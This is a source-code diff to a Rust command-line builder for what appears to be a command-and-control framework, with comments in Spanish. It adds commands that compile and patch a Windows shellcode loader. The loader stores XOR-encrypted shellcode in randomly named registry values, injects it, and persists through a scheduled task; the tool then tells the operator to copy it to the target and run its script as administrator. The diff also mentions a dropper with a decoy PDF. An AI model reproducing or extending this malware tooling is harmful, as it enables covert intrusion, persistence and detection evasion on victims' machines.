@@ -2,12 +2,14 @@
 
 mod dll_encrypt;
 mod encrypt;
+mod loader_patch;
 mod patch;
 mod sc_generator;
 
 use clap::{Parser, Subcommand};
 use dll_encrypt::{encrypt_dll, generate_random_key, xor_encrypt};
 use encrypt::generate_agent;
+use loader_patch::TaskTrigger;
 use patch::patch_agent_binary;
 use std::env;
 use std::fs;
@@ -93,6 +95,41 @@ enum Commands {
         /// Archivo PDF de señuelo (opcional, se embebe en el dropper)
         #[arg(short, long)]
         decoy: Option<PathBuf>,
+    },
+
+    /// Genera un loader con persistencia basada en registro y tarea programada
+    /// El loader lee shellcode XOR encriptado desde el registro y lo inyecta
+    BuildLoader {
+        /// Archivo de shellcode (.bin generado por donut)
+        #[arg(short, long)]
+        shellcode: PathBuf,
+
+        /// Directorio de salida para los archivos generados
+        #[arg(short, long, default_value = "loader_output")]
+        output: PathBuf,
+
+        /// Tipo de trigger: "logon", "idle", o "daily:HH:MM"
+        #[arg(short, long, default_value = "logon")]
+        trigger: String,
+    },
+
+    /// Parchea un loader pre-compilado con nueva configuración polimórfica
+    PatchLoader {
+        /// Archivo loader.exe de entrada
+        #[arg(short, long, default_value = "loader/loader.exe")]
+        input: String,
+
+        /// Archivo de salida
+        #[arg(short, long)]
+        output: String,
+
+        /// Nombre del registro (opcional, se genera automáticamente)
+        #[arg(long)]
+        reg_key: Option<String>,
+
+        /// Nombre del valor del registro (opcional, se genera automáticamente)
+        #[arg(long)]
+        reg_value: Option<String>,
     },
 }
 
@@ -477,6 +514,174 @@ fn main() {
                 }
             }
         }
+
+        Commands::BuildLoader {
+            shellcode,
+            output,
+            trigger,
+        } => {
+            println!("🔧 C2R2 Loader Builder v1.0");
+            println!("📦 Shellcode: {}", shellcode.display());
+            println!("📁 Output directory: {}", output.display());
+            println!("⏰ Trigger: {}", trigger);
+            println!("{}", "-".repeat(50));
+
+            // Parse trigger type
+            let task_trigger = parse_trigger(&trigger);
+
+            // Validate shellcode exists
+            if !shellcode.exists() {
+                eprintln!(
+                    "❌ Error: Archivo de shellcode no encontrado: {}",
+                    shellcode.display()
+                );
+                eprintln!("\n💡 Para generar shellcode desde agent.exe:");
+                eprintln!("   1. Descarga donut: https://github.com/TheWover/donut");
+                eprintln!("   2. Ejecuta: donut.exe -i agent.exe -o shellcode.bin -f 1 -a 2");
+                std::process::exit(1);
+            }
+
+            // Get workspace root and loader template
+            let workspace_root = get_workspace_root();
+            let loader_template = workspace_root.join("target/x86_64-pc-windows-gnu/release/loader.exe");
+
+            // Check if loader is compiled
+            if !loader_template.exists() {
+                println!("\n🔨 Compilando loader...");
+                let compile_result = std::process::Command::new("cargo")
+                    .args(&[
+                        "build",
+                        "--release",
+                        "--target",
+                        "x86_64-pc-windows-gnu",
+                        "--features",
+                        "production",
+                        "-p",
+                        "loader",
+                    ])
+                    .current_dir(&workspace_root)
+                    .output();
+
+                match compile_result {
+                    Ok(result) => {
+                        if !result.status.success() {
+                            eprintln!("❌ Error compilando loader:");
+                            eprintln!("{}", String::from_utf8_lossy(&result.stderr));
+                            std::process::exit(1);
+                        }
+                        println!("✅ Loader compilado exitosamente");
+                    }
+                    Err(e) => {
+                        eprintln!("❌ Error ejecutando cargo: {}", e);
+                        std::process::exit(1);
+                    }
+                }
+            }
+
+            // Prepare deployment package
+            match loader_patch::prepare_loader_deployment(
+                &loader_template,
+                &shellcode,
+                &output,
+                task_trigger,
+            ) {
+                Ok(package) => {
+                    println!("\n✅ ¡Loader deployment package generado!");
+                    println!("\n📋 Archivos generados:");
+                    println!("   📦 Loader: {}", package.loader_path.display());
+                    println!("   📜 Script: {}", package.script_path.display());
+                    println!("\n🔑 Configuración polimórfica:");
+                    println!("   Registry Key: HKCU\\Software\\{}", package.reg_key_name);
+                    println!("   Registry Value: {}", package.reg_value_name);
+                    println!("   XOR Key: {} bytes", package.xor_key.len());
+                    println!("   Shellcode: {} bytes (encrypted)", package.encrypted_shellcode.len());
+                    println!("\n📋 Próximos pasos:");
+                    println!("   1. Copiar {} al target", package.loader_path.display());
+                    println!("   2. Ejecutar {} como administrador", package.script_path.display());
+                    println!("   3. El loader se ejecutará según el trigger configurado");
+                }
+                Err(e) => {
+                    eprintln!("❌ Error generando deployment: {}", e);
+                    std::process::exit(1);
+                }
+            }
+        }
+
+        Commands::PatchLoader {
+            input,
+            output,
+            reg_key,
+            reg_value,
+        } => {
+            println!("🔧 C2R2 Loader Patcher v1.0");
+            println!("📥 Input: {}", input);
+            println!("📤 Output: {}", output);
+            println!("{}", "-".repeat(50));
+
+            // Read loader binary
+            let loader_data = match fs::read(&input) {
+                Ok(data) => data,
+                Err(e) => {
+                    eprintln!("❌ Error leyendo loader: {}", e);
+                    std::process::exit(1);
+                }
+            };
+            println!("📊 Loader size: {} bytes", loader_data.len());
+
+            // Generate or use provided configuration
+            let xor_key = loader_patch::generate_polymorphic_xor_key();
+            let key_name = reg_key.unwrap_or_else(loader_patch::generate_registry_key_name);
+            let val_name = reg_value.unwrap_or_else(loader_patch::generate_registry_value_name);
+
+            println!("🔑 Polymorphic XOR key generated");
+            println!("📝 Registry key: HKCU\\Software\\{}", key_name);
+            println!("📝 Registry value: {}", val_name);
+
+            // Patch loader
+            match loader_patch::patch_loader_binary(&loader_data, &xor_key, &key_name, &val_name) {
+                Ok(patched) => {
+                    if let Err(e) = fs::write(&output, &patched) {
+                        eprintln!("❌ Error escribiendo loader: {}", e);
+                        std::process::exit(1);
+                    }
+                    println!("\n✅ Loader parcheado exitosamente!");
+                    println!("📦 Guardado como: {}", output);
+                    println!("\n📋 Próximos pasos:");
+                    println!("   1. Usar builder build-loader para generar el deployment completo");
+                    println!("   2. O manualmente escribir shellcode al registro con la misma key");
+                }
+                Err(e) => {
+                    eprintln!("❌ Error parcheando loader: {}", e);
+                    std::process::exit(1);
+                }
+            }
+        }
+    }
+}
+
+/// Parse trigger string into TaskTrigger enum
+fn parse_trigger(trigger: &str) -> TaskTrigger {
+    let trigger_lower = trigger.to_lowercase();
+    
+    if trigger_lower == "logon" {
+        TaskTrigger::OnLogon
+    } else if trigger_lower == "idle" {
+        TaskTrigger::OnIdle
+    } else if trigger_lower.starts_with("daily:") {
+        // Parse "daily:HH:MM" format
+        let time_part = &trigger[6..];
+        let parts: Vec<&str> = time_part.split(':').collect();
+        if parts.len() == 2 {
+            let hour: u8 = parts[0].parse().unwrap_or(8);
+            let minute: u8 = parts[1].parse().unwrap_or(0);
+            TaskTrigger::Daily(hour, minute)
+        } else {
+            println!("⚠️  Invalid time format, using default 08:00");
+            TaskTrigger::Daily(8, 0)
+        }
+    } else {
+        println!("⚠️  Unknown trigger '{}', using logon", trigger);
+        TaskTrigger::OnLogon
     }
 }
 
